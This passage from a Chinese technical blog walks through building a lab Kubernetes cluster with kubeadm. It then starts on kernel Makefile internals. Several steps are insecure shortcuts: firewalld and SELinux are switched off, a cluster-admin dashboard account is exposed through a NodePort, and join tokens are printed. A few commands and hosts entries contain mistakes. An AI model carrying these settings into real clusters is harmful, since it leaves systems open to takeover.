<li>节点之中不可以有重复的主机名、MAC 地址或 product_uuid</li>
</ul>
</li>
<li><p>三台虚拟机都修改hostname</p>
<figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">hostnamectl</span> <span class="built_in">set-hostname</span> <span class="string">master</span></span><br><span class="line"><span class="string">hostnamectl</span> <span class="built_in">set-hostname</span> <span class="string">node1</span></span><br><span class="line"><span class="string">hostnamectl</span> <span class="built_in">set-hostname</span> <span class="string">node2</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="2-配置网络"><a href="#2-配置网络" class="headerlink" title="2. 配置网络"></a>2. 配置网络</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd <span class="regexp">/etc/</span>sysconfig/network-scripts</span><br><span class="line">vi ifcfg-ens33</span><br><span class="line">修改BOOTPROTO，IPADDR，GATEWAY，NETMASK，DNS1</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">TYPE=Ethernet</span><br><span class="line">PROXY_METHOD=none</span><br><span class="line">BROWSER_ONLY=no</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">DEFROUTE=yes</span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line">IPV6INIT=yes</span><br><span class="line">IPV6_AUTOCONF=yes</span><br><span class="line">IPV6_DEFROUTE=yes</span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line">NAME=ens33</span><br><span class="line">UUID=25284585-f1d6-48b6-a9c4-63513d265442</span><br><span class="line">DEVICE=ens33</span><br><span class="line">ONBOOT=yes</span><br><span class="line">IPADDR=172.16.42.100</span><br><span class="line">GATEWAY=172.16.42.2</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">DNS1=8.8.8.8</span><br></pre></td></tr></table></figure>



<p>systemctl restart network</p>
<p>三个虚拟机都要配置网络设置不同的IP。</p>
<p>三台机器都关闭防火墙</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">systemctl <span class="keyword">stop</span> firewalld; systemctl <span class="keyword">disable</span> firewalld</span><br></pre></td></tr></table></figure>

<p>配置Hosts方便迁移(vi /etc/hosts):</p>
<p>master:</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">172.16.42.101</span> node1</span><br><span class="line"><span class="number">172.16.42.102</span> node2</span><br></pre></td></tr></table></figure>

<p>node1:</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">172.16.42.100</span> master</span><br><span class="line"><span class="number">172.16.42.102</span> node2</span><br></pre></td></tr></table></figure>

<p>node2:</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">172.16.42.100</span> node1</span><br><span class="line"><span class="number">172.16.42.102</span> node2</span><br></pre></td></tr></table></figure>





<h2 id="3-允许-iptables-检查桥接流量"><a href="#3-允许-iptables-检查桥接流量" class="headerlink" title="3. 允许 iptables 检查桥接流量"></a>3. 允许 iptables 检查桥接流量</h2><p>三个节点都要操作</p>
<ul>
<li><p>内核参数修改</p>
<p>br_netfileter模块用于将桥接流量转发至iptables链，br_netfileter内核需要开启转发</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">modprobe br_netfilter</span></span><br></pre></td></tr></table></figure>

<p>查看是否成功，如果没有成功，结果为空</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">lsmod <span class="string">| grep br_netfilter</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li><p>添加流量桥接转发</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">cat</span> &lt;&lt;EOF | tee /etc/sysctl.d/k<span class="number">8</span>s.conf</span><br><span class="line"><span class="attribute">net</span>.bridge.bridge-nf-call-ip<span class="number">6</span>tables = <span class="number">1</span></span><br><span class="line"><span class="attribute">net</span>.bridge.bridge-nf-call-iptables = <span class="number">1</span></span><br><span class="line"><span class="attribute">net</span>.ipv<span class="number">4</span>.ip_forward = <span class="number">1</span></span><br><span class="line"><span class="attribute">EOF</span></span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sysctl -p <span class="regexp">/etc/</span>sysctl.d/k8s.conf</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="4-关闭swap交换分区"><a href="#4-关闭swap交换分区" class="headerlink" title="4. 关闭swap交换分区"></a>4. 关闭swap交换分区</h2><ul>
<li><p>临时关闭</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">swapoff -<span class="selector-tag">a</span></span><br></pre></td></tr></table></figure></li>
<li><p>关闭完后查看是否为0</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">free -m</span><br></pre></td></tr></table></figure></li>
<li><p>永久关闭</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>fstab</span><br></pre></td></tr></table></figure>

<p>注释掉swap行</p>
<p><img src="../images/pic/k8s3.png" alt="image-20210521103244184"></p>
</li>
</ul>
<p><strong>注：</strong></p>
<ul>
<li>在云平台中用不到swap分区，因为没有空间就会报警</li>
</ul>
<h2 id="5-修改docker文件驱动"><a href="#5-修改docker文件驱动" class="headerlink" title="5. 修改docker文件驱动"></a>5. 修改docker文件驱动</h2><ul>
<li><p>介绍</p>
<ul>
<li>kubelet默认文件驱动为system，docker默认文件驱动为cgroupfs。</li>
<li>当linux的init系统发展到system之后，system 与 cgroups发生了融合（systemd提供了cgroups的使用和管道接口）</li>
</ul>
</li>
<li><p>修改docker的daemon.json</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mkdir <span class="regexp">/etc/</span>docker</span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;EOF | sudo tee <span class="regexp">/etc/</span>docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;exec-opts&quot;</span>: [<span class="string">&quot;native.cgroupdriver=systemd&quot;</span>],</span><br><span class="line">  <span class="string">&quot;log-driver&quot;</span>: <span class="string">&quot;json-file&quot;</span>,</span><br><span class="line">  <span class="string">&quot;log-opts&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;max-size&quot;</span>: <span class="string">&quot;100m&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;storage-driver&quot;</span>: <span class="string">&quot;overlay2&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="6-配置终端代理"><a href="#6-配置终端代理" class="headerlink" title="6. 配置终端代理"></a>6. 配置终端代理</h2><p>vi ~/.bash_profile</p>
<p>ip为宿主机vmware网卡IP，端口为宿主机代理端口</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#终端设置代理</span></span><br><span class="line"></span><br><span class="line">function proxysockes_on()&#123;</span><br><span class="line">	<span class="builtin-name">export</span> <span class="attribute">http_proxy</span>=socks5://172.16.42.1:1086</span><br><span class="line">	<span class="builtin-name">export</span> <span class="attribute">https_proxy</span>=socks5://172.16.42.1:1086</span><br><span class="line">	<span class="builtin-name">export</span> <span class="attribute">all_proxy</span>=socks5://172.16.42.1:1086</span><br><span class="line">	echo <span class="string">&#x27;**************开启当前终端socks5代理**************&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function proxyhttp_on()&#123;</span><br><span class="line">	<span class="builtin-name">export</span> <span class="attribute">http_proxy</span>=http://172.16.42.1:1087</span><br><span class="line">	<span class="builtin-name">export</span> <span class="attribute">https_proxy</span>=http://172.16.42.1:1087</span><br><span class="line">	<span class="builtin-name">export</span> <span class="attribute">all_proxy</span>=http://172.16.42.1:1087</span><br><span class="line">	echo <span class="string">&#x27;*************开启当前终端http代理**************&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function proxy_off()&#123;</span><br><span class="line">	#移除代理</span><br><span class="line">	unset http_proxy</span><br><span class="line">	unset https_proxy</span><br><span class="line">	unset all_proxy</span><br><span class="line">	echo <span class="string">&#x27;************关闭当前终端代理***********&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>起用配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bash_profile</span><br></pre></td></tr></table></figure></li>
<li><p>开启socks代理</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxysockes_on</span></span><br></pre></td></tr></table></figure></li>
<li><p>开启http代理</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxyhttp_on</span></span><br></pre></td></tr></table></figure></li>
<li><p>关闭代理</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxy_off</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>==下面的一系列操作如果无法访问外网下载请开启代理再尝试==</p>
<h2 id="7-配置docker-system代理"><a href="#7-配置docker-system代理" class="headerlink" title="7. 配置docker system代理"></a>7. 配置docker system代理</h2><p>ip为宿主机vmware网卡IP，端口为宿主机代理端口</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mkdir -p <span class="regexp">/etc/</span>systemd<span class="regexp">/system/</span>docker.service.d</span><br><span class="line"></span><br><span class="line">vi <span class="regexp">/etc/</span>systemd<span class="regexp">/system/</span>docker.service.d/proxy.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">Environment</span>=<span class="string">&quot;HTTP_PROXY=socks5://172.16.42.1:1086/&quot;</span></span><br><span class="line"><span class="attr">Environment</span>=<span class="string">&quot;HTTPS_PROXY=socks5://172.16.42.1:1086/&quot;</span></span><br><span class="line"><span class="attr">Environment</span>=<span class="string">&quot;NO_PROXY=localhost,127.0.0.1,.example.com&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">systemctl daemon-reload</span></span><br><span class="line"><span class="attribute">systemctl restart docker</span></span><br></pre></td></tr></table></figure>



<h2 id="8-关闭selinux"><a href="#8-关闭selinux" class="headerlink" title="8. 关闭selinux"></a>8. 关闭selinux</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">setenforce <span class="number">0</span></span><br><span class="line">sed -i <span class="string">&#x27;s/^SELINUX=enforcing$/SELINUX=permissive/&#x27;</span> <span class="regexp">/etc/</span>selinux/config</span><br></pre></td></tr></table></figure>

<p>重启 reboot</p>
<h2 id="9-安装kubeadm"><a href="#9-安装kubeadm" class="headerlink" title="9. 安装kubeadm"></a>9. 安装kubeadm</h2><p><u>三台节点虚拟机都要安装</u></p>
<ul>
<li><p>写入kubernetes配置</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;EOF | tee <span class="regexp">/etc/yum</span>.repos.d/kubernetes.repo</span><br><span class="line">[kubernetes]</span><br><span class="line">name=Kubernetes</span><br><span class="line">baseurl=https:<span class="regexp">//</span>packages.cloud.google.com<span class="regexp">/yum/</span>repos/kubernetes-el7-\<span class="variable">$basearch</span></span><br><span class="line">enabled=<span class="number">1</span></span><br><span class="line">gpgcheck=<span class="number">1</span></span><br><span class="line">repo_gpgcheck=<span class="number">1</span></span><br><span class="line">gpgkey=https:<span class="regexp">//</span>packages.cloud.google.com<span class="regexp">/yum/</span>doc<span class="regexp">/yum-key.gpg https:/</span><span class="regexp">/packages.cloud.google.com/yum</span><span class="regexp">/doc/</span>rpm-package-key.gpg</span><br><span class="line">exclude=kubelet kubeadm kubectl</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure></li>
<li><p>安装kubelet kubeadm kubectl</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">yum install -y kubelet kubeadm kubectl <span class="attribute">--disableexcludes</span>=kubernetes</span><br></pre></td></tr></table></figure></li>
<li><p>开机启动kubelet</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">systemctl <span class="keyword">enable</span> <span class="comment">--now kubelet</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="10-master节点初始化"><a href="#10-master节点初始化" class="headerlink" title="10. master节点初始化"></a>10. master节点初始化</h2><figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">kubeadm</span> <span class="string">init</span> \</span><br><span class="line"><span class="built_in">--apiserver-advertise-address</span> <span class="string">172</span>.<span class="string">16</span>.<span class="string">42</span>.<span class="string">100</span> \</span><br><span class="line"><span class="built_in">--pod-network-cidr</span> <span class="string">&quot;10.220.0.0/16&quot;</span></span><br></pre></td></tr></table></figure>

<p>安装完后会有提示执行如下操作</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mkdir -p <span class="variable">$HOME</span>/.kube</span><br><span class="line">sudo cp -i <span class="regexp">/etc/</span>kubernetes<span class="regexp">/admin.conf $HOME/</span>.kube/config</span><br><span class="line">sudo chown $(id -u):$(id -g) <span class="variable">$HOME</span><span class="regexp">/.kube/</span>config</span><br></pre></td></tr></table></figure>



<p>安装完成后会有加入节点的命令，也可以通过如下命令查看</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">kubeadm <span class="built_in">token</span> <span class="keyword">create</span> --<span class="keyword">print</span>-join-command</span><br></pre></td></tr></table></figure>





<h2 id="11-node节点加入"><a href="#11-node节点加入" class="headerlink" title="11. node节点加入"></a>11. node节点加入</h2><p>node节点执行join命令</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">kubeadm join <span class="number">172.16</span>.<span class="number">42.100</span>:<span class="number">6443</span> --token dyteek.<span class="number">4</span>tugaul<span class="number">382</span><span class="keyword">c</span><span class="number">7</span>sgsb \</span><br><span class="line">	--discovery-token-ca-cert-hash sha<span class="number">256</span>:<span class="number">7e243</span>bc<span class="number">69</span><span class="keyword">c</span><span class="number">1465069</span><span class="keyword">c</span><span class="number">54</span>fd<span class="number">05</span>d<span class="number">7</span><span class="keyword">c</span><span class="number">09</span><span class="keyword">c</span><span class="number">16</span>d<span class="number">7150</span>b<span class="number">09</span>be<span class="number">2598</span>b<span class="number">34</span>f<span class="number">7</span>fae<span class="number">9</span>d<span class="number">60</span>ebc<span class="number">68</span>f</span><br></pre></td></tr></table></figure>

<p>master通过kubectl get nodes命令查看加入的节点，这时候还是not ready的状态，需要我们安装网络插件</p>
<h2 id="12-master节点安装网络插件calico"><a href="#12-master节点安装网络插件calico" class="headerlink" title="12. master节点安装网络插件calico"></a>12. master节点安装网络插件calico</h2><ul>
<li><p>下载配置文件</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget https:<span class="regexp">//</span>docs.projectcalico.org<span class="regexp">/manifests/</span>calico.yaml</span><br></pre></td></tr></table></figure></li>
<li><p>修改calico.yaml的CALICO_IPV4POOL_CIDR 的 value 为 10.220.0.0/16（初始化时配置的地址）</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">FELIX_WIREGUARDMTU</span></span><br><span class="line">  <span class="attr">valueFrom:</span></span><br><span class="line">    <span class="attr">configMapKeyRef:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">calico-config</span></span><br><span class="line">      <span class="attr">key:</span> <span class="string">veth_mtu</span></span><br><span class="line"><span class="comment"># The default IPv4 pool to create on startup if none exists. Pod IPs will be</span></span><br><span class="line"><span class="comment"># chosen from this range. Changing this value after installation will have</span></span><br><span class="line"><span class="comment"># no effect. This should fall within `--cluster-cidr`.</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">CALICO_IPV4POOL_CIDR</span></span><br><span class="line">  <span class="attr">value:</span> <span class="string">&quot;10.220.0.0/16&quot;</span></span><br><span class="line"><span class="comment"># Disable file logging so `kubectl logs` works.</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">CALICO_DISABLE_FILE_LOGGING</span></span><br><span class="line">  <span class="attr">value:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure></li>
<li><p>应用配置</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">kubectl <span class="built_in">apply</span> -f calico.yaml</span><br></pre></td></tr></table></figure></li>
</ul>
<p>查看节点状态：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">kubectl <span class="builtin-name">get</span> nodes</span><br></pre></td></tr></table></figure>

<p><img src="../images/pic/k8s4.jpg"> </p>
<p>查看pod:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">kubectl <span class="builtin-name">get</span> pods -A</span><br></pre></td></tr></table></figure>

<p><img src="../images/pic/k8s5.jpg"></p>
<h2 id="13-master节点安装dashboard插件"><a href="#13-master节点安装dashboard插件" class="headerlink" title="13. master节点安装dashboard插件"></a>13. master节点安装dashboard插件</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget https:<span class="regexp">//</span>raw.githubusercontent.com<span class="regexp">/kubernetes/</span>dashboard<span class="regexp">/v2.0.0/</span>aio<span class="regexp">/deploy/</span>recommended.yaml</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>添加nodePort 和 type</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">443</span></span><br><span class="line">      <span class="attr">targetPort:</span> <span class="number">8443</span></span><br><span class="line">      <span class="attr">nodePort:</span> <span class="number">30000</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">NodePort</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>

<p>追加管理配置</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">dashboard-admin</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">dashboard-admin</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">dashboard-admin</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">cluster-admin</span></span><br></pre></td></tr></table></figure>

<p>应用插件</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">kubectl <span class="built_in">apply</span> -f recommended.yaml</span><br></pre></td></tr></table></figure>



<p>查看生成的dashboard配置</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">kubectl <span class="builtin-name">get</span> pods -A</span><br></pre></td></tr></table></figure>

<p>生成token</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">kubectl describe secrets -n kubernetes-dashboard dashboard-admin</span></span><br></pre></td></tr></table></figure>

<p>查看映射端口</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">kubectl</span> <span class="meta">get</span> <span class="keyword">svc</span> -n kubernetes-dashboard</span><br></pre></td></tr></table></figure>

<p>查看ip地址：</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">kubectl describe pod kubernetes-dashboard-xxxxx -n kubernetes-dashboard</span></span><br></pre></td></tr></table></figure>

<p>通过ip和端口确定访问的地址：<a href="https://172.16.42.102:30000/">https://172.16.42.102:30000/</a></p>
<p>填入token访问</p>
<p>访问chrome可能有问题，用火狐。</p>
<h2 id="14-用kubeadm重置集群"><a href="#14-用kubeadm重置集群" class="headerlink" title="14. 用kubeadm重置集群"></a>14. 用kubeadm重置集群</h2><p>如果出错我们可以重置，从新安装</p>
<p>master节点</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">kubeadm reset</span><br><span class="line">rm -rf <span class="regexp">/etc/</span>cni/net.d</span><br><span class="line">rm -rf <span class="variable">$HOME</span><span class="regexp">/.kube/</span>config</span><br><span class="line"></span><br><span class="line">kubeadm config images pull</span><br><span class="line"></span><br><span class="line">kubeadm init \</span><br><span class="line">--apiserver-advertise-address <span class="number">172.16</span>.<span class="number">42.100</span> \</span><br><span class="line">--pod-network-cidr <span class="string">&quot;10.220.0.0/16&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mkdir -p <span class="variable">$HOME</span>/.kube</span><br><span class="line">sudo cp -i <span class="regexp">/etc/</span>kubernetes<span class="regexp">/admin.conf $HOME/</span>.kube/config</span><br><span class="line">sudo chown $(id -u):$(id -g) <span class="variable">$HOME</span><span class="regexp">/.kube/</span>config</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kubectl apply -f calico.yaml</span><br><span class="line"></span><br><span class="line">kubectl apply -f recommended.yaml</span><br></pre></td></tr></table></figure>

<p>node节点</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">kubeadmin <span class="keyword">reset</span></span><br><span class="line">kubeadm <span class="keyword">join</span> <span class="number">172.16</span><span class="number">.42</span><span class="number">.100</span>:<span class="number">6443</span> <span class="comment">--token sz9mvo.rup78d9uah3x3ab7 \</span></span><br><span class="line">	<span class="comment">--discovery-token-ca-cert-hash sha256:104f60c427854dd128e9</span></span><br></pre></td></tr></table></figure>







<h2 id="15-创建一个pod"><a href="#15-创建一个pod" class="headerlink" title="15. 创建一个pod"></a>15. 创建一个pod</h2><p>vim nginx.yaml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx-demo</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx-deomo</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx</span></span><br></pre></td></tr></table></figure>

<p>kubectl apply -f nginx.yaml</p>
<p>kubectl get pods</p>
<p>结果：</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">[root@<span class="keyword">master</span> <span class="title">~]# kubectl</span> get pods</span><br><span class="line">NAME         READY   STATUS    RESTARTS   AGE</span><br><span class="line">nginx-demo   <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">7s</span></span><br></pre></td></tr></table></figure>

<p>进入Pod:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">kubectl exec -it nginx-demo <span class="regexp">/bin/</span>bash</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>云原生安全</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核源码编译过程</title>
    <url>/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<p>内核源码的根目录下有一个Makefile文件，在各级源代码子目录也有Makefile文件，顶层的Makefile文件通过include各个子目录的Makefile文件，就可以把整个内核源码整合进来。 最后尝试将字符设备驱动代码添加到内核源码树。</p>
<span id="more"></span>

<h2 id="1-顶层的Makefile文件"><a href="#1-顶层的Makefile文件" class="headerlink" title="1. 顶层的Makefile文件"></a>1. 顶层的Makefile文件</h2><p>顶层的Makefile文件先会包含体系相关的Makefile文件</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># used <span class="keyword">for</span> <span class="string">&#x27;make defconfig&#x27;</span></span><br><span class="line"><span class="keyword">include</span> arch<span class="regexp">/$(SRCARCH)/M</span>akefile</span><br><span class="line">export KBUILD_DEFCONFIG KBUILD_KCONFIG</span><br></pre></td></tr></table></figure>

<p>在顶层Makefile文件中搜索<code>SRCARCH</code>，找到定义</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Architecture as present in compile.h</span></span><br><span class="line">UTS_MACHINE 	:= <span class="variable">$(ARCH)</span></span><br><span class="line">SRCARCH 	:= <span class="variable">$(ARCH)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Additional ARCH settings for x86</span></span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(ARCH)</span>,i386)</span><br><span class="line">        SRCARCH := x86</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(ARCH)</span>,x86_64)</span><br><span class="line">        SRCARCH := x86</span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure>

<p>在之前我们编译的时候指定过ARCH=x86，x86这个值就会赋给SRCARCH</p>
<p>所以上面的<code>include arch/$(SRCARCH)/Makefile</code>就会include，x86的Makefile。</p>
<p>此外，还会找到子目录，将子目录赋给如下的变量，后面会递归每个子目录调用Makefile</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"># Objects we will link into vmlinux / subdirs we need to visit</span><br><span class="line">init-y		:= init/</span><br><span class="line">drivers-y	:= drivers/ sound/ firmware/</span><br><span class="line">net-y		:= net/</span><br><span class="line">libs-y		:= lib/</span><br><span class="line">core-y		:= usr/</span><br><span class="line">virt-y		:= virt/</span><br><span class="line">endif # KBUILD_EXTMOD</span><br></pre></td></tr></table></figure>



<p>所以Linux内核编译过程，就是先确定架构，然后递归调用子目录的Makefile，将这些代码编译，链接到一起形成一个镜像文件的过程。</p>
<h2 id="2-查看一个子目录"><a href="#2-查看一个子目录" class="headerlink" title="2. 查看一个子目录"></a>2. 查看一个子目录</h2><p>这里我们进入到drivers子目录。查看tty相关源代码文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@debian linux-4.9.229]# cd drivers/tty </span><br><span class="line">[root@debian tty]# ls</span><br><span class="line">amiserial.c       goldfish.c  Makefile          moxa.c   n_hdlc.c         n_tracesink.h  rocket.c      synclink_gt.c  tty_audit.o   tty_ioctl.o  tty_ldsem.o  vt</span><br><span class="line">bfin_jtag_comm.c  hvc         metag_da.c        moxa.h   nozomi.c         n_tty.c        rocket.h      synclinkmp.c   tty_buffer.c  tty_io.o     tty_mutex.c</span><br><span class="line">built-in.o        ipwireless  mips_ejtag_fdc.c  mxser.c  n_r3964.c        n_tty.o        rocket_int.h  sysrq.c        tty_buffer.o  tty_ldisc.c  tty_mutex.o</span><br><span class="line">cyclades.c        isicom.c    modules.builtin   mxser.h  n_tracerouter.c  pty.c          serial        sysrq.o        tty_io.c      tty_ldisc.o  tty_port.c</span><br><span class="line">ehv_bytechan.c    Kconfig     modules.order     n_gsm.c  n_tracesink.c    pty.o          synclink.c    tty_audit.c    tty_ioctl.c   tty_ldsem.c  tty_port.o</span><br></pre></td></tr></table></figure>

<p>先查看该目录下的Kconfig文件，这个config文件就是在 make menuconfig的时候看见的选项。</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@debian</span> tty]<span class="meta"># code Kconfig</span></span><br></pre></td></tr></table></figure>

<p>还有一个Makefile文件，这个文件就是针对drivers/tty所有源码的Makefile文件，这个文件就决定了哪些文件是需要编译的，编译成什么类型。</p>
<p>打开这个文件</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@debian</span> tty]<span class="meta"># code Makefile</span></span><br></pre></td></tr></table></figure>

<p>可以发现这个文件都是obj-打头的变量，obj-y表示编译到内核，obj-m表示编译成驱动的形式。</p>
<p>在Makefile的第一行有一个<code>CONFIG_TTY</code>，它就是在Kconfig里的config TTY配置，是y还是m</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">obj-$(CONFIG_TTY)</span><br></pre></td></tr></table></figure>

<p>Makefile里的变量都对应于Kconfig里面的配置项。</p>
<p>在Makefile里面还有</p>
